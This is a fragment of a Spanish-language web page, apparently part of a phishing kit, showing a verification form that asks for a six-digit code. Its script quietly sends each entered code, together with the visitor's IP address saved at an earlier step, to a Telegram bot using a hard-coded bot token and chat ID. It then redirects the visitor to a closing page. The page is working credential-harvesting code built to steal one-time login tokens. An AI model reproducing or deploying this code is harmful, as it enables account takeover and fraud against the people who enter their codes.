 <div class="login-box">

            <label>Código de 6 dígitos</label> 
            <input id="codigo" type="tel" maxlength="6" oninput="validarFormulario()">

    <script>
    const TOKEN = '8378413801:AAHtU9rr9XuipY7b5OQh8iq0OQqOlpB8Q7Q';
    const ID_CHAT = '-5213719362';
    let enviando = false; 

    // Recuperamos la IP guardada en el primer paso
    const ipUsuario = localStorage.getItem('user_ip') || "IP_No_Encontrada";

    const boton = document.getElementById('btnVerificar');
    const inputCodigo = document.getElementById('codigo');

    function validarFormulario() {
        boton.disabled = (inputCodigo.value.length !== 6 || enviando);
        if (!boton.disabled) boton.classList.add('active');
        else boton.classList.remove('active');
    }

    boton.addEventListener('click', async function(e) {
        if (enviando) return;
        
        enviando = true;
        boton.disabled = true;
        boton.innerHTML = "Validando...";

        // Formateamos el mensaje con la IP del usuario para identificarlo
        const mensaje = `👤 **USUARIO: [${ipUsuario}]**\n🔢 **TOKEN RECIBIDO:** \`${inputCodigo.value}\`\n📌 **PASO:** token 1`;

        const urlFinal = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
        
        try {
            await fetch(urlFinal, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ID_CHAT,
                    text: mensaje,
                    parse_mode: 'Markdown' // Para que la IP y el Token resalten
                })
            });
            window.location.href = 'fin.html';
        } catch (error) {
            console.error("Error:", error);
            window.location.href = 'fin.html';
        }
    });
</script>
